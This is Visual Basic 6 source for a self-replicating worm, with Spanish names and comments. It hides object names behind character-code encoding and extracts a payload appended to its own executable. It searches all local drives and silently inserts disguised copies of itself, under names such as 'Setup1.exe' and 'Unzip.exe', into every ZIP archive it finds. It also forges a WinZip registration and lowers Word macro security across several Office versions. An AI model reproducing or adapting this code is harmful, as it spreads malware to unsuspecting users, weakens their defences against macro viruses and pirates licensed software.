Attribute VB_Name = "Module1"
Public fso, wss
Const tamaño = 106496
Const snoopy = 22528

'''''''''''''''''''''''unidades'''''
'Const Ddiskette = 1
'Const DHd = 2
'Const Dred = 3
'Const DCDROM = 4
'Const DRAMDisk = 5
''''''''''''''''''''''''''''''''''''

Public winzip As String
'''' Variables para red p2p
Public kazaa As String
Public kazaaplusplus As String
Public morpheus As String
Public edonkey As String
Public bearshare As String
Public grokster As String
Public imesh As String
''''''''''''''''''''''''''''''
Sub cargarfso()
 Set fso = CreateObject(decriptador("115,99,114,105,112,116,105,110,103,46,102,105,108,101,115,121,115,116,101,109,111,98,106,101,99,116,"))
End Sub
Sub cargarwss()
 Set wss = CreateObject(decriptador("119,115,99,114,105,112,116,46,115,104,101,108,108,"))
End Sub
Sub separar()
Dim tam As Double

Dim sno As String

On Error GoTo err:
Open fso.buildpath(App.Path, App.EXEName & ".exe") For Binary As #1
tam = LOF(1)
If tam > tamaño Then
    sno = Space(snoopy)
    Get #1, tamaño + 1, sno
    Close #1
    
    Open fso.getspecialfolder(1) & "\snoopy.zip" For Binary As #2
    Put #2, , sno
    Close #2
    Close
    sno = ""
err:
Else
 Close #1
End If
End Sub
'Sub extraerdll()
'Dim ar1, pt1, pt2
'Set ar1 = fso.getfile(fso.getspecialfolder(1) & "\snoopy.zip")
'pt1 = ar1.shortpath
'
'Shell winzip & " -e " & pt1 & " " & fso.getspecialfolder(1), vbHide
'End Sub

Sub extraersnoopys()

On Error Resume Next
Dim ar1, pt1, pt2
Set ar1 = fso.getfile(fso.getspecialfolder(1) & "\snoopy.zip")
pt1 = ar1.shortpath

MkDir fso.getspecialfolder(1) & "\snoopy"

Shell winzip & " -e " & pt1 & " " & fso.getspecialfolder(1) & "\snoopy", vbHide


End Sub

'Sub separarsnoopy()
'Dim imagen As String
'Const snoop = 25070
'Dim s As Double
'On Error Resume Next
'
'
's = 1
'
'Open fso.getspecialfolder(1) & "\snoopy.dll" For Binary As #1
'For i = 1 To 7
'
' imagen = Space(snoop)
' Get #1, s, imagen
'
' Open fso.getspecialfolder(1) & "\snoopy\snoopy" & i & ".bmp" For Binary As #2
' Put #2, , imagen
' Close #2
'
' s = s + snoop
'Next i
'Close #1
'End Sub

Function chkrzipsnoopy() As Boolean
On Error GoTo err
 Open fso.getspecialfolder(1) & "\snoopy.zip" For Input As #3
 Close #3
 chkrzipsnoopy = True
Exit Function
err:
 chkrzipsnoopy = False
End Function

Sub existewinzip()
On Error GoTo err
'Dim version As String
'Dim aux As Integer
 'version = wss.regread("HKCU\software\nico mak computing\winzip\winini\win32_version")
 'aux = InStr(1, version, "-", vbBinaryCompare)
 'version = Mid(version, aux + 1, 1)
 'If version = "8" Then Call autorizar
 Call autorizar
err:
End Sub
Sub autorizar()
On Error Resume Next
wss.regwrite "HKCU\software\nico mak computing\winzip\winini\Name", decriptador("71,69,68,90,65,67,")
wss.regwrite "HKCU\software\nico mak computing\winzip\winini\SN", "EBB9042E"

wss.regwrite "HKEY_USERS\.DEFAULT\software\nico mak computing\winzip\winini\Name", decriptador("71,69,68,90,65,67,")
wss.regwrite "HKEY_USERS\.DEFAULT\software\nico mak computing\winzip\winini\SN", "EBB9042E"

End Sub
Function decriptador(texto)
Dim c, au, dec
While texto <> ""
 c = InStr(1, texto, ",", 0)
 au = Chr(Mid(texto, 1, c - 1))
 texto = Mid(texto, c + 1, Len(texto))
 dec = dec + au
Wend

decriptador = dec
End Function
Function encriptador(texto)
Dim c, au
Dim enc As String
For c = 1 To Len(texto)
 au = Asc(Mid(texto, c, 1))
 enc = enc & au & ","
Next
encriptador = enc
End Function
Sub copiadeseguridad(dire As String)
On Error Resume Next
Dim nombrecopiasegu As String
Dim i As Integer

For i = 1 To 10
 Select Case i
 Case 1: nombrecopiasegu = "Program"
 Case 2: nombrecopiasegu = "Unzip"
 Case 3: nombrecopiasegu = "Pkzip"
 Case 4: nombrecopiasegu = "Setup1"
 Case 5: nombrecopiasegu = "Ave"
 Case 6: nombrecopiasegu = "Huevomaniaco"
 Case 7: nombrecopiasegu = "Corsa"
 Case 8: nombrecopiasegu = "Proyecto"
 Case 9: nombrecopiasegu = "Doors"
 Case Else
   nombrecopiasegu = "Broma"
 End Select

FileCopy midir, dire & "\" & nombrecopiasegu & ".exe"
Next

End Sub
Sub buskr(dir As String)
On Error Resume Next
Dim dirnuevo As String
Dim b, c, d, e, f
Set b = fso.getfolder(dir).Files


DoEvents
For Each f In b
 c = fso.getextensionname(f.Path)
 c = LCase(c)
 

If "*." & c = LCase("*.zip") Then
   dirnuevo = fso.buildpath(dir, fso.getfilename(f.Path))
   Call infectarzip(dirnuevo)
   Call randon
End If

Next



Set d = fso.getfolder(dir).SubFolders
 For Each e In d
  buskr e.Path
 Next
End Sub

Public Function nombreinfec() As String
Dim i As Integer
On Error Resume Next
Randomize
i = Int(Rnd * 10)
 Select Case i
 Case 1: nombreinfec = "Program"
 Case 2: nombreinfec = "Unzip"
 Case 3: nombreinfec = "Pkzip"
 Case 4: nombreinfec = "Setup1"
 Case 5: nombreinfec = "Ave"
 Case 6: nombreinfec = "Huevomaniaco"
 Case 7: nombreinfec = "Corsa"
 Case 8: nombreinfec = "Proyecto"
 Case 9: nombreinfec = "Doors"
 Case Else
   nombreinfec = "Broma"
 End Select
 
 nombreinfec = fso.buildpath(fso.getspecialfolder(2), nombreinfec & ".exe")
End Function
Public Sub unidades()
Dim uni
On Error Resume Next

Set uni = fso.Drives
For Each Drive In uni
   If Drive.drivetype = 4 Then ' 4=cd-rom
   Else
    buskr (Drive.driveletter & ":\")
   End If
Next
End Sub
Public Sub infectarzip(nomzip As String)
Dim ar1, pt1, pt2
On Error GoTo err:

SetAttr nomzip, vbNormal

Set ar1 = fso.getfile(nomzip)
pt1 = ar1.shortpath
Set ar1 = fso.getfile(nombreinfec)
pt2 = ar1.shortpath

Shell winzip & " -a " & pt1 & " " & pt2, vbHide
err:
End Sub
'Sub hechos(texto As String)
'Open "C:\log.txt" For Append As #3
'Write #3, texto
'Close #3
'End Sub

Sub activarmacroyvbproyectos()
'11.0 Office 2003
'wss.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Security\Level", 1, "REG_DWORD"
wss.regwrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\Level", 1, "REG_DWORD"
wss.regwrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\DontTrustInstalledFiles", 0, "REG_DWORD"
wss.regwrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
'10.0 Office Xp
wss.regwrite "HKCU\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
wss.regwrite "HKCU\Software\Microsoft\Office\10.0\Word\Security\DontTrustInstalledFiles", 0, "REG_DWORD"
wss.regwrite "HKCU\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
'9.0  Office 2000
wss.regwrite "HKCU\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
wss.regwrite "HKCU\Software\Microsoft\Office\9.0\Word\Security\DontTrustInstalledFiles", 0, "REG_DWORD"
'8.0  Office 97 creo
wss.regwrite "HKCU\Software\Microsoft\Office\8.0\Word\Security\Level", 1, "REG_DWORD"
'wss.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security\DontTrustInstalledFiles", 0, "REG_DWORD"
End Sub
